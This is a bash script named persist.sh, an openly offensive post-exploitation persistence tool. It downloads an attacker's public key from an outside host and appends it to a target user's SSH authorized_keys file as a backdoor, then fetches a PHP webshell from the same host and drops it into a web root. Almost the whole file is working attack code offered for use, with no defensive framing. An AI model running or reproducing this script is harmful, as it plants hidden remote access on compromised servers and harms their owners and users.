#!/bin/bash

#Variables
webroot=$2
path="$1.ssh/authorized_keys"
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"



#Usage
if [[ $1 == '' ]];then
	echo 'Usage:./persist.sh [~directory] [web-root]'
	exit
fi


#SSH Backdoor

ssh(){
	printf "$blue[+] Attempting to set SSH backdoor...\n"
	if [[ -e "$path" ]];then
		if [[ -w "$path" ]];then
			curl -sSO http://:8000/ominousSHELL.pub \
				>> $path
			if [[ $? == 0 ]];then
				printf "$green[+] Done\n"
				printf "$green[+] File: $path\n"
			else
				printf "$red[-] Error occured.\n"
			fi
		else
			printf "$red[-] Error: File \"$path\" is not writable.\n"

		fi
	else
		printf "$red[-] Error: File \"$path\" does not exist.\n"
		
	fi
}
ssh


#WEBSHELL Backdoor
web() {
	if [[ $webroot == '' ]]; then
		exit
	fi
	printf "$blue[+] Attempting to set WEBSHELL backdoor...\n"
	if [[ -e "$webroot" ]];then
		if [[ -w "$webroot" ]];then
			curl -sS http://:8000/w-shell.php \
				>> "$webroot.ominousSHELL.php"
			if [[ $? == 0 ]];then
				printf "$green[+] Done.\n"
				printf "$green[+] File: $webroot.ominousSHELL.php\n"
			else
				printf "$red[-] Error occured\n"
			fi
		else
			printf "$red[-] Error: Directory \"$webroot\" is not writable\n"
		fi
	else
		printf "$red[-] Error: Directory \"$webroot\" does not exist\n"
	fi

}
web
printf "$blue[+] Done.\n"
